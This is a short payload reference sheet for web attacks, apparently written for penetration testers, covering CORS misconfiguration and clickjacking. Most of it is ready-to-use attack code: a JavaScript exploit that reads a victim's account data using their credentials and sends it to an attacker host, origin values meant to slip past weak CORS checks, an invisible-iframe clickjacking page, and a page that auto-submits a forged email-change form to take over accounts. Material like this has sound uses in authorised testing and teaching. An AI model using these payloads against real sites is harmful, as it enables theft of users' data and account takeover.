# CORS & Clickjacking - Payload Reference

## CORS Misconfiguration

### Basic Origin Reflection (Verified)
```
GET /api/userinfo HTTP/1.1
Origin: https://evil.com

# If response contains:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
# = CORS misconfiguration confirmed
```

### Exploit
```javascript
// Attacker's page
fetch('https://victim.com/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    // Exfiltrate user data
    fetch('https://evil.com/steal?data=' + btoa(JSON.stringify(data)));
  });
```

### Detection Steps
1. Send request with `Origin: https://evil.com`
2. Check if `Access-Control-Allow-Origin: https://evil.com` in response
3. Check if `Access-Control-Allow-Credentials: true`
4. If both = full CORS exploit possible

### Common Weak CORS
```
# Null origin
Origin: null

# Subdomain wildcard
Origin: https://evil.victim.com

# Regex bypass
Origin: https://victim.com.evil.com
```

---

## Clickjacking

### Basic Attack
```html
<style>
iframe {
  position: relative;
  width: 700px;
  height: 500px;
  opacity: 0.0001;
  z-index: 2;
}
button {
  position: absolute;
  top: 350px;
  left: 75px;
  z-index: 1;
}
</style>
<button>Click me!</button>
<iframe src="https://victim.com/account"></iframe>
```

### With CSRF Token
```html
<!-- Extract CSRF token from iframe, auto-submit form -->
<style>
iframe { opacity: 0; position: absolute; }
</style>
<iframe name="target" src="https://victim.com/account"></iframe>
<form action="https://victim.com/change-email" method="POST" target="target">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf" value="EXTRACTED_TOKEN">
</form>
<script>
// Auto-submit after iframe loads
setTimeout(() => document.forms[0].submit(), 2000);
</script>
```

### Bypass X-Frame-Options
```
# If X-Frame-Options: DENY
# Try:
- CSP frame-ancestors bypass
- Double framing
- Meta refresh
- window.open() + postMessage
```
